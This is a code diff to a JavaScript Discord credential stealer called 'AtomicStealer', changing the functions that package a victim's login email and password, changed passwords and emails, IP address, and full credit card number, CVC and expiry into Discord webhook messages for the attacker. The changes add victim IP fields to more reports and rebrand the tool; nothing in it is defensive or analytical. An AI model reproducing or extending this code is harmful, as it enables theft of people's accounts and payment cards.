@@ -149,7 +149,7 @@ function Login(email, password, token) {
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
@@ -177,7 +177,7 @@ function Login(email, password, token) {
 
                         {
                             "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}`,
+                            "value": `\`${ip}```,
                             "inline": false
                         }
                     ],
@@ -186,7 +186,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic"
+                        "text": "AtomicStealer"
                     }
                 }
             ]
@@ -208,7 +208,7 @@ function ChangePassword(oldpassword, newpassword, token) {
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
@@ -231,6 +231,13 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": true
+                        },
+
+
+                        {
+                            "name": ":globe_with_meridians: | Ip :",
+                            "value": `\`${ip}```,
+                            "inline": false
                         }
                     ],
                     "author": {
@@ -238,7 +245,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic"
+                        "text": "AtomicStealer"
                     }                 
                 }
             ]
@@ -259,7 +266,7 @@ function ChangeEmail(newemail, password, token) {
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
@@ -282,6 +289,13 @@ function ChangeEmail(newemail, password, token) {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": false
+                        },
+
+
+                        {
+                            "name": ":globe_with_meridians: | Ip :",
+                            "value": `\`${ip}```,
+                            "inline": false
                         }
                     ],
                     "author": {
@@ -289,7 +303,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic On Top"
+                        "text": "AtomicStealer"
                     }                
                 }
             ]
@@ -309,14 +323,14 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         var json = JSON.parse(info);
         var params = {
             username: "Atomic",
-            content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            content: "",
+            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<a:card:932017676610580551> | Credit Card Added",
+                            "name": ":credit_card: | Credit Card Added",
                             "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
                             "inline": false
                         },
@@ -333,6 +347,13 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": false
+                        },
+
+
+                        {
+                            "name": ":globe_with_meridians: | Ip :",
+                            "value": `\`${ip}```,
+                            "inline": false
                         }
                     ],
                     "author": {
@@ -340,7 +361,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic On Top"
+                        "text": "AtomicStealer"
                     }
                 }
             ]
